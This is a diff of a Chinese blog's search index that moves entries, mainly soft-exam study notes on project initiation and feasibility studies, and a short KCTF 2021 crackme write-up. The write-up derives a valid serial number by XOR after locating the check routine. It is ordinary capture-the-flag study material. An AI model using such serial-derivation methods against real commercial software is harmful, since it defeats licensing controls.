+<p>即需满足：0x5EE54F4C ^ serial = 0x52A1ED5A<br>serial = 0x5EE54F4C^0x52A1ED5A=’205824534’ (转成10进制字符串)</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>kctf2021</category>
+      </categories>
+      <tags>
+        <tag>kctf2021</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>项目成本管理</title>
     <url>/2022/04/11/%E9%A1%B9%E7%9B%AE%E6%88%90%E6%9C%AC%E7%AE%A1%E7%90%86/</url>
     <content><![CDATA[<font color="red">### 10大管理学习主线</font>
@@ -1405,35 +1434,6 @@ IGMP允许Internet中的计算机参加多播， 是计算机用做向相邻多�
       </categories>
       <tags>
         <tag>Textual Criticism</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>身在何处wp</title>
-    <url>/2021/11/15/%E8%BA%AB%E5%9C%A8%E4%BD%95%E5%A4%84wp/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目来自于<a href="https://ctf.pediy.com/game-team_list-15-21.htm">看雪CTF (pediy.com)</a></p>
-<p>原题下载链接：<a href="https://pan.lanzoui.com/ip5mnwj2nlc?w">kctf2021.rar - 蓝奏云 (lanzoui.com)</a></p>
-<h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><p>通过字符串Success!直接定位到关键函数</p>
-<blockquote>
-<p>关键点在于第二次f_generate生成的字符串要与0x1388C77相等</p>
-<p>f_generate生成值与传入的参数有关，相同参数返回相同结果</p>
-<p><img src="https://i.loli.net/2021/11/15/aBHn3JOLhvTYldA.png" alt="func.png"></p>
-</blockquote>
-<p>f_generate分成两个部分</p>
-<blockquote>
-<p>第一部分与参数无关，通过循环加异或生成一个固定字符串0x2D02EF80</p>
-<p>再与传入的字符串参数作用生成j，最后取~j作为返回值</p>
-<p><img src="https://i.loli.net/2021/11/15/zbsx4K9vTf8VkBW.png" alt="func2.png"></p>
-</blockquote>
-<h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p>因为最后只要将序列号和由用户名生成的随机数进行异或，得到的值再传入f_generate能生成0x13B88C77即可，所以直接获取题目中包含的用户名和序列号，得到第二次传入的值0x52A1ED5A</p>
-<p><img src="https://i.loli.net/2021/11/15/xiA51tBo9U2dKTW.png" alt="number.png"></p>
-<p>即需满足：0x5EE54F4C ^ serial = 0x52A1ED5A<br>serial = 0x5EE54F4C^0x52A1ED5A=’205824534’ (转成10进制字符串)</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>kctf2021</category>
-      </categories>
-      <tags>
-        <tag>kctf2021</tag>
       </tags>
   </entry>
   <entry>
@@ -1688,141 +1688,6 @@ IGMP允许Internet中的计算机参加多播， 是计算机用做向相邻多�
       <tags>
         <tag>Textual Criticism</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>项目立项管理</title>
-    <url>/2022/03/30/%E9%A1%B9%E7%9B%AE%E7%AB%8B%E9%A1%B9%E7%AE%A1%E7%90%86/</url>
-    <content><![CDATA[<h3 id="立项管理内容"><a href="#立项管理内容" class="headerlink" title="立项管理内容"></a>立项管理内容</h3><p>&emsp;&emsp;项目立项一般包括提交<strong>项目建议书、项目可行性研究、项目招标与投标</strong>等内容。</p>
-<h4 id="项目建议书"><a href="#项目建议书" class="headerlink" title="项目建议书"></a>项目建议书</h4><p>&emsp;&emsp;<font color="red">项目建议书（又称立项申请）是<strong>项目建设单位</strong>向<strong>上级主管部门</strong>提交项目申请时所必须的文件，是对拟建项目提出的框架性的总体设想。在项目建议书批准后， 方可开展对外工作。</font></p>
-<font color="red">(选择题)项目建议书应该包括的核心内容如下:</font>
-
-<ol>
-<li><font color="red">项目的必要性。</font></li>
-<li><font color="red">项目的市场预测。</font></li>
-<li><font color="red">产品方案或服务的市场预测。</font></li>
-<li><font color="red">项目建设必需的条件。</font>
-
-</li>
-</ol>
-<h4 id="项目可行性研究报告"><a href="#项目可行性研究报告" class="headerlink" title="项目可行性研究报告"></a>项目可行性研究报告</h4><p>&emsp;&emsp;可行性研究具有预见性、公正性、可靠性、科学性的特点。</p>
-<font color="red">可行性研究内容一般包含如下内容：</font>
-
-<ol>
-<li><font color="red">投资必要性</font></li>
-<li><font color="red">技术的可行性</font></li>
-<li><font color="red">财务可行性</font></li>
-<li><font color="red">组织可行性</font></li>
-<li><font color="red">经济可行性</font></li>
-<li><font color="red">社会可行性</font></li>
-<li><font color="red">风险因素及对策</font>
-
-</li>
-</ol>
-<h4 id="项目招投标"><a href="#项目招投标" class="headerlink" title="项目招投标"></a>项目招投标</h4><p>（会有专门的课程讲法规）</p>
-<p>&emsp;&emsp;为防止投标人在投标后撤标或在中标后拒不签订合同，招标人通常都要求投标人提供—定比例或金额的投标保证金。招标人决定中标人后，未中标的投标人已缴纳的保证金即予退还。</p>
-<p>&emsp;&emsp;如果以邮寄方式送达的，投标人必须留出邮寄时间，保证投标文件能够在截止日期之前送达招标人指定的地点，而不是以 “ 邮戳为准＂。在截止时间后送达的投标文件，即已经过了招标有效期的，招标人应当原封退回，不得进入开标阶段。</p>
-<h3 id="可行性研究"><a href="#可行性研究" class="headerlink" title="可行性研究"></a>可行性研究</h3><h4 id="可行性研究的内容"><a href="#可行性研究的内容" class="headerlink" title="可行性研究的内容"></a>可行性研究的内容</h4><h5 id="技术可行性分析"><a href="#技术可行性分析" class="headerlink" title="技术可行性分析"></a>技术可行性分析</h5><font color="red">技术可行性分析—般应当考虑以下因素。</font>
-
-<ol>
-<li><font color="red">进行项目开发的风险。在给定的限制范围和时间期限内，能否设计出预期的系统并实现必须的功能和性能。</font></li>
-<li><font color="red">人力资源的有效性。可以用于项目开发的**技术人员**队伍是否可以建立， 是否存在人力资源不足、技术能力欠缺等问题， 是否可以在市场上或者通过培训获得所需要的**熟练技术人员**。</font></li>
-<li><font color="red">技术能力的可能性。相关技术的发展趋势和当前所掌握的技术是否支持该项目的开发， 市场上是否存在支持该技术的开发环境、平台和工具。</font></li>
-<li><font color="red">物资（产品）的可用性。是否存在可以用于建立系统的其他资源，如—些设备以及可行的替代产品等。</font>
-
-</li>
-</ol>
-<h5 id="经济可行性分析"><a href="#经济可行性分析" class="headerlink" title="经济可行性分析"></a>经济可行性分析</h5><font color="red">经济可行性分析具体包括支出分析、收益分析、投资回报分析以及敏感性分析等：</font>
-
-<ol>
-<li><font color="red">支出分析：信息系统项目的支出可以分为一次性支出和非一次性支出两类。</font></li>
-<li><font color="red">收益分析： 信息系统项目的收益包括直接收益、间接收益以及其他方面的收益等。</font></li>
-<li><font color="red">收益投资比、投资回收期分析： 对投入产出进行对比分析， 以确定项目的收益率和投资回收期等经济指标。（之后会学计算题）</font></li>
-<li><font color="red">敏感性分析：当诸如设备和软件配置、处理速度要求、系统的工作负荷类型和负荷量等关键性因素变化时，对支出和收益产生影响的估计。</font>
-
-</li>
-</ol>
-<p>&emsp;&emsp;除了上述的经济方面的分析外，一般还需要对项目的社会效益进行分析。例如，通过项目的实施，可以在管理水平、技术手段、人员素质等方面获得潜在的效益。</p>
-<h5 id="运行环境可行性分析"><a href="#运行环境可行性分析" class="headerlink" title="运行环境可行性分析"></a>运行环境可行性分析</h5><p>&emsp;&emsp;运行环境是制约信息系统在用户单位发挥效益的关键。因此，需要从用户单位（企业）的管理体制、管理方法、规章制度、工作习惯、人员素质（甚至包括人员的心理承受能力、接受新知识和技能的积极性等）、数据资源积累、硬件（包含系统软件）平台等多方面进行评估， 以确定软件系统在交付以后， 是否能够在用户单位顺利运行。</p>
-<h5 id="其他方面的可行性分析"><a href="#其他方面的可行性分析" class="headerlink" title="其他方面的可行性分析"></a>其他方面的可行性分析</h5><p>&emsp;&emsp;信息系统项目的可行性研究除了前面介绍的技术、经济和运行环境可行性分析外，还包括了诸如<strong>法律可行性、社会可行性</strong>等方面的可行性分析。</p>
-<h4 id="可行性研究的步骤"><a href="#可行性研究的步骤" class="headerlink" title="可行性研究的步骤"></a>可行性研究的步骤</h4><p>&emsp;&emsp;<font color="red">—般地，可行性研究分为初步可行性研究、详细可行性研究、可行性研究报告三个基本的阶段</font></p>
-<p>&emsp;&emsp;（不要求会）可行性研究可以归纳成几个基本步骤：</p>
-<pre><code>(1)确定项目规模和目标。
-(2)研究正在运行的系统。
-(3)建立新系统的逻辑模型。
-(4)导出和评价各种方案。
-(5)推荐可行性方案。
-(6)编写可行性研究报告。
-(7)递交可行性研究报告。
-</code></pre><h4 id="初步可行性研究"><a href="#初步可行性研究" class="headerlink" title="初步可行性研究"></a>初步可行性研究</h4><h5 id="初步可行性研究的定义及目的"><a href="#初步可行性研究的定义及目的" class="headerlink" title="初步可行性研究的定义及目的"></a>初步可行性研究的定义及目的</h5><p>&emsp;&emsp;初步可行性研究—般是在对市场或者客户情况进行调查后， 对项目进行的初步评估。</p>
-<p>&emsp;&emsp;详细可行性研究需要对项目在技术、经济、社会、运行环境、法律等方面进行深入的调查研究和分析， 是一项费时、费力的工作， 特别是大型的或比较复杂的项目更是如此。</p>
-<p>&emsp;&emsp;进行初步可行性评估， 可以从几个方面进行衡量， 以便决定是否开始详细可行性研究：</p>
-<pre><code>(1)分析项目的前途，从而决定是否应该继续深入调查研究。
-(2)初步估计和确定项目中的关键技术及核心问题，以确定是否需要解决。
-(3)初步估计必须进行的辅助研究， 以解决项目的核心间题， 并判断是否具备必要的技术、实验、人力条件作为支持。
-</code></pre><p>&emsp;&emsp;<font color="red">经过初步可行性研究， 可以形成<strong>初步可行性研究报告</strong></font></p>
-<h5 id="初步可行性研究的结果及作用"><a href="#初步可行性研究的结果及作用" class="headerlink" title="初步可行性研究的结果及作用"></a>初步可行性研究的结果及作用</h5><p>&emsp;&emsp;<font color="red">初步项目可行性研究的内容与详细的项目可行性研究基本相同，</font>要包括以下内容：市场情况、信息系统设计开发能力、配件、网络物理布局、技术和设备选择、网络安装工程、企业管理费、人力资源、项目实施及经济评价。</p>
-<p>&emsp;&emsp;<font color="red">在初步项目可行性研究之前可进行项目机会研究， 如果就投资可能性已进行了项目机会研究， 那么项目的初步可行性研究阶段往往可以省去。</font></p>
-<h5 id="辅助（功能）研究"><a href="#辅助（功能）研究" class="headerlink" title="辅助（功能）研究"></a>辅助（功能）研究</h5><p>&emsp;&emsp;<font color="red">辅助（功能）研究包括项目的一个或几个方面， 但不是所有方面</font></p>
-<h4 id="详细可行性研究"><a href="#详细可行性研究" class="headerlink" title="详细可行性研究"></a>详细可行性研究</h4><p>&emsp;&emsp;<strong>机会研究、 初步可行性研究、 详细可行性研究、 评估与决策</strong>是投资前时期的四个阶段。 在实际工作中， 前三个阶段依项目的规模和繁简程度可把前两个阶段省略或合二为—，但详细可行性研究是不可缺少的。 升级改造项目只做初步和详细研究， 小项目一般只进行详细可行性研究。</p>
-<h5 id="详细可行性研究的原则与程序框架"><a href="#详细可行性研究的原则与程序框架" class="headerlink" title="详细可行性研究的原则与程序框架"></a>详细可行性研究的原则与程序框架</h5><p>&emsp;&emsp;（可以不看）详细可行性研究的基本原则：</p>
-<pre><code>(1)科学性原则。
-(2)客观性原则。
-(3)公正性原则。
-</code></pre><h5 id="详细可行性研究的方法"><a href="#详细可行性研究的方法" class="headerlink" title="详细可行性研究的方法"></a>详细可行性研究的方法</h5><p>&emsp;&emsp;（可以不看，只需了解是详细可行性研究的方法即可）可行性研究的方法很多， 如经济评价法、市场预测法、投资估算法和增量净效益法等。</p>
-<p>&emsp;&emsp;增量净效益法(有无比较法)：将有项目时的成本（效益）与无项目时的成本（效益）进行比较， 求得两者差额，即为增量成本（效益）， 这种方法称之为有无比较法。</p>
-<h5 id="详细可行性研究的内容"><a href="#详细可行性研究的内容" class="headerlink" title="详细可行性研究的内容"></a>详细可行性研究的内容</h5><font color="red">信息系统项目详细可行性研究的内容，一般可以归纳如下（常给出几点考缺少哪点，大概率是缺钱相关的）：</font>
-
-<ol>
-<li><font color="red">概述</font>：提出项目开发的背景、必要性和经济意义， 研究项目工作的依据和范围，产品交付的形式、种类、数量。</li>
-<li><font color="red">需求确定</font>： 调查研究国内外客户的需求情况， 对国内外的技术趋势进行分析，确定项目的规模、目标、产品、方案和发展方向。</li>
-<li><font color="red">现有资源、设施情况分析</font>： 调查现有的资源（包括硬件设备、软件系统、数据、规章制度等种类与数量， 以及这些资源的使用情况和可能的更新情况）。</li>
-<li><font color="red">设计（初步）技术方案</font>： 确定项目的总体和详细目标、范围， 总体的结构和组成， 核心技术和关键问题、产品的功能与性能。</li>
-<li><font color="red">项目实施进度计划建议</font>。</li>
-<li><font color="red"><strong>投资估算和资金筹措计划</strong></font>。</li>
-<li><font color="red">项目组织、人力资源、技术培训计划</font>： 包括现有的人员规模、组织结构、人员层次、个人技术能力、人员技术培训计划等。</li>
-<li><font color="red"><strong>经济和社会效益分析（效果评价）</strong></font>。</li>
-<li><font color="red">合作／协作方式</font>。</li>
-</ol>
-<h4 id="效益的预测与评估"><a href="#效益的预测与评估" class="headerlink" title="效益的预测与评估"></a>效益的预测与评估</h4><p>&emsp;&emsp;对于效益的量化及计算方法有函数求解法、相关关系法、模糊数学法、专家意见法（德尔菲法）、成本降低法、利润增加发</p>
-<h3 id="项目评估与论证"><a href="#项目评估与论证" class="headerlink" title="项目评估与论证"></a>项目评估与论证</h3><h4 id="项目论证"><a href="#项目论证" class="headerlink" title="项目论证"></a>项目论证</h4><h5 id="项目论证的概念"><a href="#项目论证的概念" class="headerlink" title="项目论证的概念"></a>项目论证的概念</h5><p>&emsp;&emsp;项目论证是指对拟实施项目技术上的先进性、适用性， 经济上的合理性、盈利性， 实施上的可能性、风险性进行全面科学的综合分析， 为项目决策提供客观依据的一种技术经济研究活动。</p>
-<h5 id="项目论证的作用"><a href="#项目论证的作用" class="headerlink" title="项目论证的作用"></a>项目论证的作用</h5><font color="red">项目前评价的作用主要体现在以下几个方面：</font>
-
-<ol>
-<li><font color="red">项目论证是确定项目是否实施的依据。</font></li>
-<li><font color="red">项目论证是筹措资金、向银行贷款的依据。</font></li>
-<li><font color="red">项目论证是编制计划、设计、采购、施工以及机构设备、资源配置的依据。</font></li>
-<li><font color="red">项目论证是防范风险、提高项目效率的重要保证。</font>
-
-</li>
-</ol>
-<h5 id="项目论证的阶段划分"><a href="#项目论证的阶段划分" class="headerlink" title="项目论证的阶段划分"></a>项目论证的阶段划分</h5><p>项目论证一般分为机会研究、初步可行性研究和详细可行性研究三个阶段。</p>
-<p><img src="https://s2.loli.net/2022/03/30/D6B7XKoJabm8OHy.png" alt="image-20220330143617293"></p>
-<h5 id="项目论证的一般程序"><a href="#项目论证的一般程序" class="headerlink" title="项目论证的一般程序"></a>项目论证的一般程序</h5><p>（只考过一次，可以不看，看的话提取关键字记住顺序）项目论证的一般程序，一般有以下七个主要步骤：</p>
-<pre><code>(1) 明确项目范围和业主目标。
-(2) 收集并分析相关资料。
-(3) 拟定多种可行的能够相互替代的实施方案。
-(4) 多方案分析、比较。
-(5) 选择最优方案进一步详细全面地论证
-(6) 编制项目论证报告、环境影响报告书和采购方式审批报告。
-(7) 编制资金筹措计划和项目实施进度计划。
-</code></pre><h5 id="项目评估"><a href="#项目评估" class="headerlink" title="项目评估"></a>项目评估</h5><h5 id="项目评估的含义及其依据"><a href="#项目评估的含义及其依据" class="headerlink" title="项目评估的含义及其依据"></a>项目评估的含义及其依据</h5><p>&emsp;&emsp;项目评估指在项目可行性研究的基础上， 由<font color="red">第三方（国家、银行或有关机构）</font>根据国家颁布的政策、 法规、 方法、 参数和条例等， 从项目（或企业）、国民经济、社会角度出发，对拟建项目建设的必要性、建设条件、生产条件、产品市场需求、工程技术、经济效益和社会效益等进行评价、 分析和论证，进而判断其是否可行的一个评估过程。项目评估是项目投资前期进行决策管理的重要环节，<font color="red">其目的是审查项目可行性研究的可靠性真实性和客观性，为银行的贷款决策或行政主管部门的审批决策提供科学依据。</font></p>
-<font color="red">项目评估的最终成果是项目评估报告。</font>
-
-<p>&emsp;&emsp;项目评估的依据包括如下项目:</p>
-<pre><code>项目建议书及其批准文件。
-项目可行性研究报告。
-报送单位的申请报告及主管部门的初审意见。
-有关资源、配件、燃料、水、电、交通、通信、资金（包括外汇）等方面的协议文件。
-必需的其他文件和资料。
-</code></pre><h3 id="补充考点："><a href="#补充考点：" class="headerlink" title="补充考点："></a>补充考点：</h3><ol>
-<li>项目论证与评估是项目立项前的最后一关，“先论证(评估)，后决策”是现代项目管理的一项基本原则。</li>
-<li>项目可行性研究报告的编制内容与项目建议书批复内容有重大变更的，应重新报批项目建议书。项目初步设计方案和投资概算报告的编制内容与项目可行性研究报告批复内容有重大变更或变更投资<font color="red">超出已批复总投资额度10%的</font>，应重新报批可行性研究报告。项目初步设计方案和投资概算报告的编制内容与项目可行性研究报告批复内容有少量调整且其调整内容未超出已批复总投资额度10%的，需在提交项目初步设计方案和投资概算报告时<font color="red">以独立章节对调整部分进行定量补充说明</font>。</li>
-<li>3、项目识别是承建方项目立项的第一步，其目的在于选择投资机会、鉴别投资方向。从政策导向中寻找项目机会、从市场需求中寻找项目机会、从技术发展中寻找项目机会。承建方的项目立顶注意表现在:我公司人员是否满足要求，技术水平是否足够、竞争对手如何、是否赚钱。<br>项目机会选择主要渠道包括：(1)国家政策，产业导向；(2)市场需求；(3)技术发展；(4)特定事件。</li>
-</ol>
-]]></content>
-      <categories>
-        <category>软考</category>
-      </categories>
   </entry>
   <entry>
     <title>项目范围管理</title>
@@ -2080,6 +1945,141 @@ IGMP允许Internet中的计算机参加多播， 是计算机用做向相邻多�
       <tags>
         <tag>Textual Criticism</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>项目立项管理</title>
+    <url>/2022/03/30/%E9%A1%B9%E7%9B%AE%E7%AB%8B%E9%A1%B9%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<h3 id="立项管理内容"><a href="#立项管理内容" class="headerlink" title="立项管理内容"></a>立项管理内容</h3><p>&emsp;&emsp;项目立项一般包括提交<strong>项目建议书、项目可行性研究、项目招标与投标</strong>等内容。</p>
+<h4 id="项目建议书"><a href="#项目建议书" class="headerlink" title="项目建议书"></a>项目建议书</h4><p>&emsp;&emsp;<font color="red">项目建议书（又称立项申请）是<strong>项目建设单位</strong>向<strong>上级主管部门</strong>提交项目申请时所必须的文件，是对拟建项目提出的框架性的总体设想。在项目建议书批准后， 方可开展对外工作。</font></p>
+<font color="red">(选择题)项目建议书应该包括的核心内容如下:</font>
+
+<ol>
+<li><font color="red">项目的必要性。</font></li>
+<li><font color="red">项目的市场预测。</font></li>
+<li><font color="red">产品方案或服务的市场预测。</font></li>
+<li><font color="red">项目建设必需的条件。</font>
+
+</li>
+</ol>
+<h4 id="项目可行性研究报告"><a href="#项目可行性研究报告" class="headerlink" title="项目可行性研究报告"></a>项目可行性研究报告</h4><p>&emsp;&emsp;可行性研究具有预见性、公正性、可靠性、科学性的特点。</p>
+<font color="red">可行性研究内容一般包含如下内容：</font>
+
+<ol>
+<li><font color="red">投资必要性</font></li>
+<li><font color="red">技术的可行性</font></li>
+<li><font color="red">财务可行性</font></li>
+<li><font color="red">组织可行性</font></li>
+<li><font color="red">经济可行性</font></li>
+<li><font color="red">社会可行性</font></li>
+<li><font color="red">风险因素及对策</font>
+
+</li>
+</ol>
+<h4 id="项目招投标"><a href="#项目招投标" class="headerlink" title="项目招投标"></a>项目招投标</h4><p>（会有专门的课程讲法规）</p>
+<p>&emsp;&emsp;为防止投标人在投标后撤标或在中标后拒不签订合同，招标人通常都要求投标人提供—定比例或金额的投标保证金。招标人决定中标人后，未中标的投标人已缴纳的保证金即予退还。</p>
+<p>&emsp;&emsp;如果以邮寄方式送达的，投标人必须留出邮寄时间，保证投标文件能够在截止日期之前送达招标人指定的地点，而不是以 “ 邮戳为准＂。在截止时间后送达的投标文件，即已经过了招标有效期的，招标人应当原封退回，不得进入开标阶段。</p>
+<h3 id="可行性研究"><a href="#可行性研究" class="headerlink" title="可行性研究"></a>可行性研究</h3><h4 id="可行性研究的内容"><a href="#可行性研究的内容" class="headerlink" title="可行性研究的内容"></a>可行性研究的内容</h4><h5 id="技术可行性分析"><a href="#技术可行性分析" class="headerlink" title="技术可行性分析"></a>技术可行性分析</h5><font color="red">技术可行性分析—般应当考虑以下因素。</font>
+
+<ol>
+<li><font color="red">进行项目开发的风险。在给定的限制范围和时间期限内，能否设计出预期的系统并实现必须的功能和性能。</font></li>
+<li><font color="red">人力资源的有效性。可以用于项目开发的**技术人员**队伍是否可以建立， 是否存在人力资源不足、技术能力欠缺等问题， 是否可以在市场上或者通过培训获得所需要的**熟练技术人员**。</font></li>
+<li><font color="red">技术能力的可能性。相关技术的发展趋势和当前所掌握的技术是否支持该项目的开发， 市场上是否存在支持该技术的开发环境、平台和工具。</font></li>
+<li><font color="red">物资（产品）的可用性。是否存在可以用于建立系统的其他资源，如—些设备以及可行的替代产品等。</font>
+
+</li>
+</ol>
+<h5 id="经济可行性分析"><a href="#经济可行性分析" class="headerlink" title="经济可行性分析"></a>经济可行性分析</h5><font color="red">经济可行性分析具体包括支出分析、收益分析、投资回报分析以及敏感性分析等：</font>
+
+<ol>
+<li><font color="red">支出分析：信息系统项目的支出可以分为一次性支出和非一次性支出两类。</font></li>
+<li><font color="red">收益分析： 信息系统项目的收益包括直接收益、间接收益以及其他方面的收益等。</font></li>
+<li><font color="red">收益投资比、投资回收期分析： 对投入产出进行对比分析， 以确定项目的收益率和投资回收期等经济指标。（之后会学计算题）</font></li>
+<li><font color="red">敏感性分析：当诸如设备和软件配置、处理速度要求、系统的工作负荷类型和负荷量等关键性因素变化时，对支出和收益产生影响的估计。</font>
+
+</li>
+</ol>
+<p>&emsp;&emsp;除了上述的经济方面的分析外，一般还需要对项目的社会效益进行分析。例如，通过项目的实施，可以在管理水平、技术手段、人员素质等方面获得潜在的效益。</p>
+<h5 id="运行环境可行性分析"><a href="#运行环境可行性分析" class="headerlink" title="运行环境可行性分析"></a>运行环境可行性分析</h5><p>&emsp;&emsp;运行环境是制约信息系统在用户单位发挥效益的关键。因此，需要从用户单位（企业）的管理体制、管理方法、规章制度、工作习惯、人员素质（甚至包括人员的心理承受能力、接受新知识和技能的积极性等）、数据资源积累、硬件（包含系统软件）平台等多方面进行评估， 以确定软件系统在交付以后， 是否能够在用户单位顺利运行。</p>
+<h5 id="其他方面的可行性分析"><a href="#其他方面的可行性分析" class="headerlink" title="其他方面的可行性分析"></a>其他方面的可行性分析</h5><p>&emsp;&emsp;信息系统项目的可行性研究除了前面介绍的技术、经济和运行环境可行性分析外，还包括了诸如<strong>法律可行性、社会可行性</strong>等方面的可行性分析。</p>
+<h4 id="可行性研究的步骤"><a href="#可行性研究的步骤" class="headerlink" title="可行性研究的步骤"></a>可行性研究的步骤</h4><p>&emsp;&emsp;<font color="red">—般地，可行性研究分为初步可行性研究、详细可行性研究、可行性研究报告三个基本的阶段</font></p>
+<p>&emsp;&emsp;（不要求会）可行性研究可以归纳成几个基本步骤：</p>
+<pre><code>(1)确定项目规模和目标。
+(2)研究正在运行的系统。
+(3)建立新系统的逻辑模型。
+(4)导出和评价各种方案。
+(5)推荐可行性方案。
+(6)编写可行性研究报告。
+(7)递交可行性研究报告。
+</code></pre><h4 id="初步可行性研究"><a href="#初步可行性研究" class="headerlink" title="初步可行性研究"></a>初步可行性研究</h4><h5 id="初步可行性研究的定义及目的"><a href="#初步可行性研究的定义及目的" class="headerlink" title="初步可行性研究的定义及目的"></a>初步可行性研究的定义及目的</h5><p>&emsp;&emsp;初步可行性研究—般是在对市场或者客户情况进行调查后， 对项目进行的初步评估。</p>
+<p>&emsp;&emsp;详细可行性研究需要对项目在技术、经济、社会、运行环境、法律等方面进行深入的调查研究和分析， 是一项费时、费力的工作， 特别是大型的或比较复杂的项目更是如此。</p>
+<p>&emsp;&emsp;进行初步可行性评估， 可以从几个方面进行衡量， 以便决定是否开始详细可行性研究：</p>
+<pre><code>(1)分析项目的前途，从而决定是否应该继续深入调查研究。
+(2)初步估计和确定项目中的关键技术及核心问题，以确定是否需要解决。
+(3)初步估计必须进行的辅助研究， 以解决项目的核心间题， 并判断是否具备必要的技术、实验、人力条件作为支持。
+</code></pre><p>&emsp;&emsp;<font color="red">经过初步可行性研究， 可以形成<strong>初步可行性研究报告</strong></font></p>
+<h5 id="初步可行性研究的结果及作用"><a href="#初步可行性研究的结果及作用" class="headerlink" title="初步可行性研究的结果及作用"></a>初步可行性研究的结果及作用</h5><p>&emsp;&emsp;<font color="red">初步项目可行性研究的内容与详细的项目可行性研究基本相同，</font>要包括以下内容：市场情况、信息系统设计开发能力、配件、网络物理布局、技术和设备选择、网络安装工程、企业管理费、人力资源、项目实施及经济评价。</p>
+<p>&emsp;&emsp;<font color="red">在初步项目可行性研究之前可进行项目机会研究， 如果就投资可能性已进行了项目机会研究， 那么项目的初步可行性研究阶段往往可以省去。</font></p>
+<h5 id="辅助（功能）研究"><a href="#辅助（功能）研究" class="headerlink" title="辅助（功能）研究"></a>辅助（功能）研究</h5><p>&emsp;&emsp;<font color="red">辅助（功能）研究包括项目的一个或几个方面， 但不是所有方面</font></p>
+<h4 id="详细可行性研究"><a href="#详细可行性研究" class="headerlink" title="详细可行性研究"></a>详细可行性研究</h4><p>&emsp;&emsp;<strong>机会研究、 初步可行性研究、 详细可行性研究、 评估与决策</strong>是投资前时期的四个阶段。 在实际工作中， 前三个阶段依项目的规模和繁简程度可把前两个阶段省略或合二为—，但详细可行性研究是不可缺少的。 升级改造项目只做初步和详细研究， 小项目一般只进行详细可行性研究。</p>
+<h5 id="详细可行性研究的原则与程序框架"><a href="#详细可行性研究的原则与程序框架" class="headerlink" title="详细可行性研究的原则与程序框架"></a>详细可行性研究的原则与程序框架</h5><p>&emsp;&emsp;（可以不看）详细可行性研究的基本原则：</p>
+<pre><code>(1)科学性原则。
+(2)客观性原则。
+(3)公正性原则。
+</code></pre><h5 id="详细可行性研究的方法"><a href="#详细可行性研究的方法" class="headerlink" title="详细可行性研究的方法"></a>详细可行性研究的方法</h5><p>&emsp;&emsp;（可以不看，只需了解是详细可行性研究的方法即可）可行性研究的方法很多， 如经济评价法、市场预测法、投资估算法和增量净效益法等。</p>
+<p>&emsp;&emsp;增量净效益法(有无比较法)：将有项目时的成本（效益）与无项目时的成本（效益）进行比较， 求得两者差额，即为增量成本（效益）， 这种方法称之为有无比较法。</p>
+<h5 id="详细可行性研究的内容"><a href="#详细可行性研究的内容" class="headerlink" title="详细可行性研究的内容"></a>详细可行性研究的内容</h5><font color="red">信息系统项目详细可行性研究的内容，一般可以归纳如下（常给出几点考缺少哪点，大概率是缺钱相关的）：</font>
+
+<ol>
+<li><font color="red">概述</font>：提出项目开发的背景、必要性和经济意义， 研究项目工作的依据和范围，产品交付的形式、种类、数量。</li>
+<li><font color="red">需求确定</font>： 调查研究国内外客户的需求情况， 对国内外的技术趋势进行分析，确定项目的规模、目标、产品、方案和发展方向。</li>
+<li><font color="red">现有资源、设施情况分析</font>： 调查现有的资源（包括硬件设备、软件系统、数据、规章制度等种类与数量， 以及这些资源的使用情况和可能的更新情况）。</li>
+<li><font color="red">设计（初步）技术方案</font>： 确定项目的总体和详细目标、范围， 总体的结构和组成， 核心技术和关键问题、产品的功能与性能。</li>
+<li><font color="red">项目实施进度计划建议</font>。</li>
+<li><font color="red"><strong>投资估算和资金筹措计划</strong></font>。</li>
+<li><font color="red">项目组织、人力资源、技术培训计划</font>： 包括现有的人员规模、组织结构、人员层次、个人技术能力、人员技术培训计划等。</li>
+<li><font color="red"><strong>经济和社会效益分析（效果评价）</strong></font>。</li>
+<li><font color="red">合作／协作方式</font>。</li>
+</ol>
+<h4 id="效益的预测与评估"><a href="#效益的预测与评估" class="headerlink" title="效益的预测与评估"></a>效益的预测与评估</h4><p>&emsp;&emsp;对于效益的量化及计算方法有函数求解法、相关关系法、模糊数学法、专家意见法（德尔菲法）、成本降低法、利润增加发</p>
+<h3 id="项目评估与论证"><a href="#项目评估与论证" class="headerlink" title="项目评估与论证"></a>项目评估与论证</h3><h4 id="项目论证"><a href="#项目论证" class="headerlink" title="项目论证"></a>项目论证</h4><h5 id="项目论证的概念"><a href="#项目论证的概念" class="headerlink" title="项目论证的概念"></a>项目论证的概念</h5><p>&emsp;&emsp;项目论证是指对拟实施项目技术上的先进性、适用性， 经济上的合理性、盈利性， 实施上的可能性、风险性进行全面科学的综合分析， 为项目决策提供客观依据的一种技术经济研究活动。</p>
+<h5 id="项目论证的作用"><a href="#项目论证的作用" class="headerlink" title="项目论证的作用"></a>项目论证的作用</h5><font color="red">项目前评价的作用主要体现在以下几个方面：</font>
+
+<ol>
+<li><font color="red">项目论证是确定项目是否实施的依据。</font></li>
+<li><font color="red">项目论证是筹措资金、向银行贷款的依据。</font></li>
+<li><font color="red">项目论证是编制计划、设计、采购、施工以及机构设备、资源配置的依据。</font></li>
+<li><font color="red">项目论证是防范风险、提高项目效率的重要保证。</font>
+
+</li>
+</ol>
+<h5 id="项目论证的阶段划分"><a href="#项目论证的阶段划分" class="headerlink" title="项目论证的阶段划分"></a>项目论证的阶段划分</h5><p>项目论证一般分为机会研究、初步可行性研究和详细可行性研究三个阶段。</p>
+<p><img src="https://s2.loli.net/2022/03/30/D6B7XKoJabm8OHy.png" alt="image-20220330143617293"></p>
+<h5 id="项目论证的一般程序"><a href="#项目论证的一般程序" class="headerlink" title="项目论证的一般程序"></a>项目论证的一般程序</h5><p>（只考过一次，可以不看，看的话提取关键字记住顺序）项目论证的一般程序，一般有以下七个主要步骤：</p>
+<pre><code>(1) 明确项目范围和业主目标。
+(2) 收集并分析相关资料。
+(3) 拟定多种可行的能够相互替代的实施方案。
+(4) 多方案分析、比较。
+(5) 选择最优方案进一步详细全面地论证
